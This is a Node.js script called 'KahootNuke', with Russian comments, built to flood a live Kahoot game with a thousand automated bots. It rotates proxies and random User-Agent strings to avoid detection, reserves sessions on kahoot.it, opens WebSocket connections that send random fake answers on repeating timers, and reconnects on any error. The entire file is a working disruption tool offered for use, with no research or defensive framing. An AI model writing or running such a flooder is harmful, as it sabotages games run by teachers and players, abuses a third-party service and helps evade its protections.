const WebSocket = require('ws');
const axios = require('axios');
const randomUseragent = require('random-useragent');

const FLOOD_CONFIG = {
  GAME_PIN: '123456', // Целевой пин игры
  BOT_COUNT: 1000, // Количество ботов
  PROXY_LIST: ['http://proxy1:port', 'http://proxy2:port'], // Прокси-сервера
  DELAY: 100 // Задержка между подключениями (мс)
};

class KahootNuke {
  constructor() {
    this.activeBots = 0;
    this.startFlood();
  }

  async createBot() {
    const agent = randomUseragent.getRandom();
    const proxy = FLOOD_CONFIG.PROXY_LIST[Math.floor(Math.random() * FLOOD_CONFIG.PROXY_LIST.length)];
    
    try {
      // Получаем токен сессии
      const { data } = await axios.post(`https://kahoot.it/reserve/session/${FLOOD_CONFIG.GAME_PIN}`, {}, {
        headers: { 'User-Agent': agent },
        proxy: { host: proxy.split(':')[0], port: proxy.split(':')[1] }
      });

      const ws = new WebSocket(`wss://kahoot.it/cometd/${FLOOD_CONFIG.GAME_PIN}/${data.session}`, {
        headers: { 'User-Agent': agent }
      });

      ws.on('open', () => {
        this.activeBots++;
        // Отправляем фейковые ответы
        setInterval(() => {
          ws.send(JSON.stringify([{
            channel: "/service/controller",
            data: {
              type: "message",
              gameid: FLOOD_CONFIG.GAME_PIN,
              host: "kahoot.it",
              content: JSON.stringify({
                choice: Math.floor(Math.random() * 4),
                meta: { lag: 0, device: { userAgent: agent, screen: { width: 1920, height: 1080 } } }
              })
            }
          }]));
        }, Math.random() * 5000 + 1000);
      });

      ws.on('error', () => this.reconnect());
      
    } catch (e) { /* Обработка ошибок */ }
  }

  reconnect() {
    setTimeout(() => this.createBot(), 5000);
  }

  startFlood() {
    for (let i = 0; i < FLOOD_CONFIG.BOT_COUNT; i++) {
      setTimeout(() => this.createBot(), i * FLOOD_CONFIG.DELAY);
    }
  }
}

new KahootNuke();
